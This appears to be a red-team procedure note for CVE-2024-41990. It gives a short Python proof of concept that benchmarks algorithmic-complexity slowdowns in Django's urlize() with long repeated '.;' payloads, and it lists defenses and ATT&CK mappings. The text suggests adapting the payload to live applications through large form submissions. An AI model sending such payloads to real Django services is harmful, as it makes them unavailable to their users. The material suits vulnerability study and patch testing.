---
id: proc-uuid-123
tags:
  - dos
  - django
  - python
  - web
  - cve-2024-41990
type: procedure
tools:
  - '[[tools/Python]]'
  - '[[tools/Django]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/import-django-utils-html]]'
  - '[[commands/import-time-module]]'
  - '[[commands/print-test-header]]'
  - '[[commands/loop-payload-sizes]]'
  - '[[commands/start-timing]]'
  - '[[commands/generate-payload]]'
  - '[[commands/execute-urlize]]'
  - '[[commands/print-timing-results]]'
verified: false
platforms:
  - Web
  - Python
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[Endpoint Denial of Service]]'
updated_at: '2025-12-14T17:27:02.957Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Endpoint Denial of Service]]'
---
---

# Demonstrate-DoS-in-Django-urlize-with-Repeated-Payloads

## Summary

This procedure demonstrates a denial-of-service vulnerability in Django's django.utils.html.urlize() and urlizetrunc() template filters by exploiting algorithmic complexity with large inputs of repeated '.;' characters, causing exponential processing slowdowns that can lead to service unavailability if user inputs are not size-limited.

## Description

The vulnerability, identified as CVE-2024-41990, affects Django applications where urlize or urlizetrunc filters process user-controlled strings, such as in POST requests or database content rendered in templates. By crafting payloads with repeated '.;' (semicolon-dot), the function experiences quadratic or worse time complexity, resulting in delays from seconds to minutes for inputs over 100,000 characters. This PoC script benchmarks the issue locally but can be adapted to target live applications via large form submissions. Prerequisites include a Django environment; outcomes show processing times scaling exponentially, e.g., 80k chars in 0.5s to 1M chars in over 100s, enabling DoS attacks.

## Requirements

1. Python 3.x with Django installed (vulnerable version, e.g., pre-patch for CVE-2024-41990)
2. Access to run Python scripts; for real attacks, ability to submit large POST data to Django endpoints using urlize filters
3. No network access needed for PoC; in production, HTTP access to the web app

## Defense

Defensive measures and detection strategies:

- Implement input size limits (e.g., max 10k chars) on fields processed by urlize/urlizetrunc
- Upgrade Django to patched versions (post-CVE-2024-41990)
- Monitor for high CPU usage or slow template rendering; use rate limiting on requests with large payloads
- Input validation to reject or sanitize repeated patterns like '.;'

## Objectives

1. Primary objective: Trigger and measure exponential slowdown in urlize function to confirm DoS potential
2. Secondary objective: Identify vulnerable Django deployments for exploitation
3. Expected outcome: Processing delays exceeding 100s for large payloads, rendering service unresponsive

## Instructions

### Step 1: Setup Imports

**Context**: Load Django's html utilities and timing module to prepare for benchmarking.

**Command** ([[commands/import-django-utils-html]]):
```python
import django.utils.html
```

> Imports the module containing the vulnerable urlize function. Expected output: None (silent import).

**Command** ([[commands/import-time-module]]):
```python
from time import time
```

> Imports time function for precise duration measurement. Expected output: None.

### Step 2: Initialize Test Logging

**Context**: Print a header to document the test start and purpose.

**Command** ([[commands/print-test-header]]):
```python
print('=== django.utils.html.urlize(".;" * n) ===')
```

> Outputs a console header for the PoC. Expected output: === django.utils.html.urlize(".;" * n) ===

### Step 3: Generate and Time Payloads

**Context**: Loop through increasing payload sizes, generate '.;' strings, execute urlize, and log times to observe degradation.

**Command** ([[commands/loop-payload-sizes]]):
```python
for i in range(0,1000000,40000):
```

> Initiates loop over payload multipliers from 0 to 1,000,000 in 40,000 steps. Expected output: None (loop control).

Inside loop:

**Command** ([[commands/start-timing]]):
```python
    start = time()
```

> Captures start timestamp. Expected output: None.

**Command** ([[commands/generate-payload]]):
```python
    PAYLOAD = ".;" * i
```

> Creates repeated '.;' string of length 2*i characters. Expected output: None.

**Command** ([[commands/execute-urlize]]):
```python
    django.utils.html.urlize(PAYLOAD)
```

> Calls the vulnerable function, triggering slowdown. Expected output: Processed HTML string (but timed).

**Command** ([[commands/print-timing-results]]):
```python
    print(len(PAYLOAD), "\t", time()- start)
```

> Logs length and elapsed time. Expected output: e.g., 80000 	 0.517104148864746

### Step 4: Review Results

**Context**: Analyze console output for exponential time growth confirming the vulnerability.

No command; inspect logs showing times like 80,000 chars: 0.517s up to 1,040,000 chars: 106.528s.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]]

### Techniques

- [[Endpoint Denial of Service]]

### Sub-Techniques


## Commands Used

- [[commands/import-django-utils-html]]
- [[commands/import-time-module]]
- [[commands/print-test-header]]
- [[commands/loop-payload-sizes]]
- [[commands/start-timing]]
- [[commands/generate-payload]]
- [[commands/execute-urlize]]
- [[commands/print-timing-results]]

## Tools Used

- [[tools/Python]]
- [[tools/Django]]

## Tags

- dos
- django
- python
- web
- cve-2024-41990
